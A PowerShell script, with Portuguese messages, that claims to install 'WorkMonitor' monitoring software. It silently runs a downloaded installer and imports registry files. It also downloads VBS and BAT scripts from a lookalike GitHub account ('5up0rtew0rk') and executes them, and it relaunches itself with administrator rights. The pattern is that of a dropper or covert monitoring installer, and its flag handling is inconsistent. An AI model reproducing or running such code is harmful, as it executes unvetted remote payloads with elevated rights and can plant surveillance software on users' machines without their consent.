$global:tempPath = "$env:TEMP"
$global:installFlag = "$tempPath\install_done.flag"
$global:installExe = "$tempPath\install.exe"
$global:vbsScript = "$tempPath\install.vbs"

function Show-Menu {
    Install-WorkMonitor
}

function Install-WorkMonitor {
    if (Test-Path $installFlag) {
        Write-Host "Instalação já realizada."
        return
    }
    
    Install-Registry
    DownloadInstaller
    
    if (Test-Path $installExe) {
        Start-Process -FilePath $installExe -ArgumentList '/s', '/v', '/qn' -NoNewWindow 
        if (-not $?) {
            Install-VBS
        }
        New-Item -Path $installFlag -ItemType File -Force | Out-Null
        ConfigurePowerSettings
        Write-Host "Instalação e configuração concluídas."
    } else {
        Write-Host "Erro: O instalador não foi baixado corretamente." -ForegroundColor Red
    }
    
}

function DownloadInstaller {
    Write-Host "Baixando instalador..."
    try {
        Invoke-WebRequest -Uri "https://www.workmonitor.com/install/install.exe" -OutFile $installExe
    } catch {
        Write-Host "Erro ao baixar o instalador: $_" -ForegroundColor Red
    }
}

function Install-Registry {
    Write-Host "Importando registros..."
    $regFiles = Get-ChildItem -Path $PSScriptRoot -Filter "*.reg"
    $success = $true

    if ($regFiles.Count -gt 0) {
        foreach ($file in $regFiles) {
            reg import $file.FullName
            if ($?) {
                Write-Host "$($file.Name) importado com sucesso."
            } else {
                Write-Host "Erro ao importar $($file.Name)." -ForegroundColor Red
                Install-VBS
                $success = $false
            }
        }
    } else {
        Write-Host "Nenhum arquivo .reg encontrado."
        $success = $false
    }

    return $success
}

function Install-VBS {
    Write-Host "Baixando script VBS..."
    try {
        $vbsUrl = "https://raw.githubusercontent.com/5up0rtew0rk/configs/refs/heads/main/main/configs.vbs"
        Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsScript
        if (Test-Path $vbsScript) {
            Write-Host "Executando script VBS..."
            Start-Process "wscript" -ArgumentList ""$vbsScript"" -NoNewWindow -Wait
        } else {
            Write-Host "Erro ao baixar o script VBS." -ForegroundColor Red
        }
    } catch {
        Write-Host "Erro ao baixar o script: $_" -ForegroundColor Red
    }
}

function ConfigurePowerSettings {
    $flagFile = "$env:TEMP\install_done.flag"
    if (-not (Test-Path $flagFile)) {
        New-Item -ItemType File -Path $flagFile -Force | Out-Null
        Start-Process -Verb RunAs -FilePath "powershell" -ArgumentList "-File `"$PSCommandPath`""
        exit
    }
    Remove-Item $flagFile -Force -ErrorAction SilentlyContinue

    Write-Host "Baixando script BAT..."
    $batUrl = "https://raw.githubusercontent.com/5up0rtew0rk/configs/refs/heads/main/main/configs.bat   "
    $batPath = "$env:TEMP\FinalTEste.bat"
    try {
        Invoke-WebRequest -Uri $batUrl -OutFile $batPath -ErrorAction Stop
        if (Test-Path $batPath) {
            Write-Host "Executando script BAT..."
            Start-Process "cmd.exe" -ArgumentList "/c `"$batPath`"" -NoNewWindow -Wait
        } else {
            Write-Host "Erro ao baixar o script BAT." -ForegroundColor Red
        }
    } catch {
        Write-Host "Erro ao baixar o script: $_" -ForegroundColor Red
    }
}

Show-Menu